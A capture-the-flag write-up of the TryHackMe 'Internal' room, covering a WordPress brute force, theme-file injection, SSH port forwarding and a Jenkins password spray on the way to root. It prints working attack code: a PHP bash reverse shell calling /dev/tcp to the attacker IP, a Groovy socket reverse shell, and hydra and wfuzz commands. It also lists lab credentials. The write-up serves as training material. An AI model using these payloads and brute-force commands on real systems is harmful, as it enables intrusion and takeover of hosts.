Internal
===
###### tags: `THM` `Hard`
###### Link: https://tryhackme.com/room/internal

# Recon

## Nmap
```bash
$ nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn $ip
```
```
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

### OS
TTL Linux

### Detect services
```bash
$ nmap -sCV -p 22,80 $ip
```
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA)
|   256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA)
|_  256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Well-known vulnerabilities
```bash
$ nmap -Pn -sV -v --script vuln -p 22,80 $ip
```
```
http-enum:
|   /blog/: Blog
|   /phpmyadmin/: phpMyAdmin
|   /wordpress/wp-login.php: Wordpress login page.
|_  /blog/wp-login.php: Wordpress login page.
```

## Dirsearch | Gobuster
```bash
$ dirsearch -u http://$ip
```
![8a90b1617800ccc510512eb737a71218.png](/THM/internal/_resources/8a90b1617800ccc510512eb737a71218.png)

```bash
$ dirsearch -u http://$ip/blog
```
![067e05a752d18c7d59e04f55f965f6d6.png](/THM/internal/_resources/067e05a752d18c7d59e04f55f965f6d6.png)

http://internal.thm/blog/readme.html
![284b5235cab9f2d19af7bd5d548916b7.png](/THM/internal/_resources/284b5235cab9f2d19af7bd5d548916b7.png)

## Accessing web page
http://10.10.116.14/blog/
![221c4bad6f0bbaa4528bdeddfa7a60f7.png](/THM/internal/_resources/221c4bad6f0bbaa4528bdeddfa7a60f7.png)

http://internal.thm/blog/
![80485c134bf8a9da35f5fad31ba3e36f.png](/THM/internal/_resources/80485c134bf8a9da35f5fad31ba3e36f.png)

http://internal.thm/blog/license.txt
![f3266d2337c7bb4a773817d9f1e3c7c9.png](/THM/internal/_resources/f3266d2337c7bb4a773817d9f1e3c7c9.png)

## Recon conclusions
* OS: Linux
* 22: OpenSSH 7.6
* 80: httpd 2.4.29
* DNS name: internal.thm
* Wordpress (license.txt its from 2020)

# Explotation

## Web Autentication
http://internal.thm/blog/wp-login.php
![94bbae29c631e7dfa94026dc79d6f3a5.png](/THM/internal/_resources/94bbae29c631e7dfa94026dc79d6f3a5.png)

http://internal.thm/blog/wp-login.php?action=lostpassword
![ba102ae07f6ad5042b0db7eaca99f5c9.png](/THM/internal/_resources/ba102ae07f6ad5042b0db7eaca99f5c9.png)

We can discover users, because the error it's different when the user exist:
![b9de2c31d34e35289e6bcaf51f0518da.png](/THM/internal/_resources/b9de2c31d34e35289e6bcaf51f0518da.png)
![5f5bf491d2682c9ada4630915f519139.png](/THM/internal/_resources/5f5bf491d2682c9ada4630915f519139.png)

Let's take advantage of this:
https://wfuzz.readthedocs.io/en/latest/user/basicusage.html
```
wfuzz -c -z "file,/usr/share/wordlists/wfuzz/others/names.txt" --sc 200 --hs "There is no account with that username or email address" -d "user_login=FUZZ&redirect_to=&wp-submit=Get+New+Password" http://$ip/blog/wp-login.php?action=lostpassword -v
```

We only discover the **admin** user, so let's try to guess the password:
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt -v $ip http-post-form '/blog/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Finternal.thm%2Fblog%2Fwp-admin%2F&testcookie=1:is incorrect'
```

```
[80][http-post-form] host: internal.thm   login: admin   password: my2boys
```
![2cd6d8f5af5ee341b70b04822b20cacd.png](/THM/internal/_resources/2cd6d8f5af5ee341b70b04822b20cacd.png)

![9c355875b412dbf8daf180a3dfe86f68.png](/THM/internal/_resources/9c355875b412dbf8daf180a3dfe86f68.png)

Version of Wordpress:
![519ef1f40fcd00c0ac7fcf590be4e931.png](/THM/internal/_resources/519ef1f40fcd00c0ac7fcf590be4e931.png)

I can't see any exploit for this version. But we are admins, we can install anything, also a reverse shell:
```
vim shell.php
```
```
<?php

/**
* Plugin Name: Reverse Shell Plugin
* Plugin URI:
* Description: Reverse Shell Plugin
* Version: 1.0
* Author: Hacker
* Author URI: https://tryhackme.com
*/

exec("/bin/bash -c 'bash -i >& /dev/tcp/10.9.3.146/9999 0>&1'")

?>
```
```
zip shell.zip shell.php
```
![bd4f2e79af99466530cd5b4cfe163bfe.png](/THM/internal/_resources/bd4f2e79af99466530cd5b4cfe163bfe.png)

But:
![017ba6886737c5e189b4685ae82b8e7c.png](/THM/internal/_resources/017ba6886737c5e189b4685ae82b8e7c.png)

Another way is changing the current theme of the page with the editor:
![b268c33a4009bd2a1473e47a9e4e0742.png](/THM/internal/_resources/b268c33a4009bd2a1473e47a9e4e0742.png)

We are going to modify, for example, the "404 page not found" message and inject malicious code (finally the pentestmonkey php reverse shell):
![98b1608285048f55ff55c991cf59d56f.png](/THM/internal/_resources/98b1608285048f55ff55c991cf59d56f.png)

http://internal.thm/wordpress/wp-content/themes/twentyseventeen/404.php
![99de8c618a561074d404f0ee1fb878a9.png](/THM/internal/_resources/99de8c618a561074d404f0ee1fb878a9.png)

![b44db44f01bf4d5adafabe18b2d61d3a.png](/THM/internal/_resources/b44db44f01bf4d5adafabe18b2d61d3a.png)

# Post-explotation

## Linpeas
```
╔══════════╣ Searching passwords in config PHP files
$dbpass='B2Ud4fEOZmVq';                                                                                                                   
$dbuser='phpmyadmin';
    // $cfg['Servers'][$i]['AllowNoPassword'] = TRUE;
// $cfg['Servers'][$i]['AllowNoPassword'] = TRUE;
define('DB_PASSWORD', 'wordpress123');
define('DB_USER', 'wordpress');
```

```
www-data@internal:/$ ss -tnlp
State    Recv-Q    Send-Q        Local Address:Port        Peer Address:Port    
LISTEN   0         128               127.0.0.1:8080             0.0.0.0:*       
LISTEN   0         128           127.0.0.53%lo:53               0.0.0.0:*       
LISTEN   0         128                 0.0.0.0:22               0.0.0.0:*       
LISTEN   0         128               127.0.0.1:42435            0.0.0.0:*       
LISTEN   0         80                127.0.0.1:3306             0.0.0.0:*       
LISTEN   0         128                       *:80                     *:*       
LISTEN   0         128                    [::]:22                  [::]:*
```

127.0.0.1:8080???

![906810cfb315b8bf44f247722062697b.png](/THM/internal/_resources/906810cfb315b8bf44f247722062697b.png)

It seems a Jenkins:
![e428672a858458b75e9708207159e143.png](/THM/internal/_resources/e428672a858458b75e9708207159e143.png)

Next to do is forward this port to our attacker machine. I tried with chisel:
```
git clone https://github.com/jpillora/chisel
cd chisel
go build -ldflags "-s -w" .
upx chisel
```

But I had an error in the victim machine because of I compiled it in mi updated machine so there is a newer library needed by the binary:
![0bdc6e2084d3eab8d51862addb815187.png](/THM/internal/_resources/0bdc6e2084d3eab8d51862addb815187.png)

I can also use ssh for port forwarding, in this case reverse port forwarding:
```
ssh -f -N -T -R 1234:127.0.0.1:8080 kali@10.9.3.146
```

\* Where "10.9.3.146" is the attacker machine.

After executing that in the victim machine, we have its port 8080 in our 1234:
![ccd0a88dd262a62805ca329bf281b165.png](/THM/internal/_resources/ccd0a88dd262a62805ca329bf281b165.png)

Can I obtain the version?
```
nmap -sCV -p 1234 localhost
```
```
PORT     STATE SERVICE VERSION
1234/tcp open  http    Jetty 9.4.30.v20200611
| http-robots.txt: 1 disallowed entry
|_/
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
|_http-server-header: Jetty(9.4.30.v20200611)
```

```
dirsearch -u http://localhost:1234 -x 404
```
![27a555039f51a05ce803cebc1d0b9bc1.png](/THM/internal/_resources/27a555039f51a05ce803cebc1d0b9bc1.png)

http://localhost:1234/error
![6e4fbca9b826268ce7b4348ebdd612a7.png](/THM/internal/_resources/6e4fbca9b826268ce7b4348ebdd612a7.png)

It's Jenkins 2.250. There is no exploit for this version.

## User flag

Looking for the Jenkins config files, I found this:
![05a20c8a771e13a99edcfd30b3f16535.png](/THM/internal/_resources/05a20c8a771e13a99edcfd30b3f16535.png)

aubreanna:bubb13guM!@#123

## Privilege escalation - root flag
I re-runed the linPEAS.sh and then I checked this paths and files but I didn't found anything interesting:
- /var/www/pub
- /var/log/apache2/access.log
- /home/aubreanna/.config/lxc/config.yml

I'm not in the sudoers file:
![dfb4830d06cbd11467c56c3963141aab.png](/THM/internal/_resources/dfb4830d06cbd11467c56c3963141aab.png)

Jenkins it's in a container:
![61f66c300b1abe223d3f4044a2ce4e1c.png](/THM/internal/_resources/61f66c300b1abe223d3f4044a2ce4e1c.png)

```
root      1442  0.0  0.2   9364  4404 ?        Sl   19:20   0:00  _ containerd-shim -namespace moby -workdir /var/lib/containerd/io.containerd.runtime.v1.linux/moby/7b979a7af7785217d1c5a58e7296fb7aaed912c61181af6d8467c062151e7fb2 -address /run/containerd/containerd.sock -containerd-binary /usr/bin/containerd -runtime-root /var/run/docker/runtime-runc
aubrean+  1476  0.0  0.0   1148     4 ?        Ss   19:20   0:00      _ /sbin/tini -- /usr/local/bin/jenkins.sh
aubrean+  1517  0.6 14.9 2614664 305636 ?      Sl   19:20   1:02          _ java -Duser.home=/var/jenkins_home -Djenkins.model.Jenkins.slaveAgentPort=50000 -jar /usr/share/jenkins/jenkins.war
```

There is Files with capabilities:
* /usr/bin/mtr-packet = cap_net_raw+ep

I try to brute force the Jenkins login using https://github.com/gquere/pwn_jenkins/blob/master/password_spraying/jenkins_password_spraying.py and guessing default user admin:

![a31917a68ff351a9ad9d96bfcb23e2f8.png](/THM/internal/_resources/a31917a68ff351a9ad9d96bfcb23e2f8.png)

`Matching password spongebob for user admin`

![3b794ebe86d34141492cb17e242fa8e6.png](/THM/internal/_resources/3b794ebe86d34141492cb17e242fa8e6.png)

After log in, I'm going to execute this as Groovy script (see https://github.com/gquere/pwn_jenkins):
```
String host="10.9.3.146";
int port=8888;
String cmd="/bin/bash";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

And we have another reverse shell, this time with the container:
![11c1eb66c989a4d1e74d97d121b87846.png](/THM/internal/_resources/11c1eb66c989a4d1e74d97d121b87846.png)

I execute linPEAS.sh but nothing interesting.

I tried to escape from the container but i need to be root: https://www.exploit-db.com/exploits/47147
```
jenkins@jenkins:/tmp$ mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
mount: only root can use "--options" option
```

Finally, looking for config files I found this:
![9ca48cebeebb26890fbac12ccba241de.png](/THM/internal/_resources/9ca48cebeebb26890fbac12ccba241de.png)

root:tr0ub13guM!@#123

There is the root credentials of the host machine:
![9dcd583f342e9342be5fbe0b87e67073.png](/THM/internal/_resources/9dcd583f342e9342be5fbe0b87e67073.png)
